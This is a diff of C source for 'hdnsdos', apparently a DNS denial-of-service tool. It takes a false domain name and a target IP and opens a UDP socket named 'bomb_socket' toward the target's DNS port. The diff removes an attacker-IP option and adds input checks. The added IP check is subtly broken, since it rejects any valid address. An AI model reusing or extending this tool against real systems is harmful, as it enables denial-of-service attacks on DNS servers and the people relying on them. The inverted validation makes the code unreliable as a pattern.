@@ -14,44 +14,64 @@
 
 void usage()
 {
-	fprintf(stderr, "hdnsdos [-d false domain name] [-a attacker ip] [-t target ip]\n");
+	fprintf(stderr, "hdnsdos [-d false domain name] [-t target ip]\n");
 	exit(1);
 }
+
+void bad_ip()
+{
+	fprintf(stderr, "Bad format of ip address\n");
+	exit(1);
+}
+
+void bad_domain()
+{
+	fprintf(stderr, "Domain name is too long\n");
+	exit(1);
+}
+
 
 int main(int argc, char **argv)
 {
 	 unsigned char datagram[1000];
 	 const u_int16_t dns_process_id = 0x1d79;
 	 char *domain_name = NULL;
-	 unsigned char *attack_address = NULL;
-	
+	 
          struct sockaddr_in target_addr_struct;
          target_addr_struct.sin_family = AF_INET;
 	 target_addr_struct.sin_port = htons(DNS_PORT);
 
 	 int loop_counter;
 	 int option_value;
-	 
+	 int ip_addr_true = 0;
+
 	 if(argc < 2)
 	 {
 		 usage();
 	 }
 
-	 while ((option_value = getopt(argc, argv, "d:t:a:h")) != -1) {
+	 while ((option_value = getopt(argc, argv, "d:t:h")) != -1) {
 	 	switch(option_value) {
 			case 'd':
+			   if(strlen(optarg) > 600)
+			   {
+				bad_domain();
+			   }
+
 			   domain_name = optarg;
+
 			   break;
-			case 'a':
-			{
-			    unsigned int temp_addr;
-			    temp_addr = inet_addr(optarg);
-			    memcpy(&attack_address, &temp_addr, IP_SIZE);
-			    break;
-			}
-			case 't':
+			case 't':		    
 			    target_addr_struct.sin_addr.s_addr = inet_addr(optarg);
+
+			    if(target_addr_struct.sin_addr.s_addr)
+			    {
+				    bad_ip();
+			    }
+			    
+			    ip_addr_true = 1;
 			    break;
+
 			case 'h':
 			    usage();			    
 			    break;
@@ -61,6 +81,18 @@ int main(int argc, char **argv)
 		}
 
 
+	}
+
+	if(domain_name == NULL)
+	{
+		printf("No domain name\n");
+		usage();
+	}
+	
+	if(ip_addr_true == 0)
+	{
+		printf("No ip address\n");
+		usage();
 	}
 
 	int bomb_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
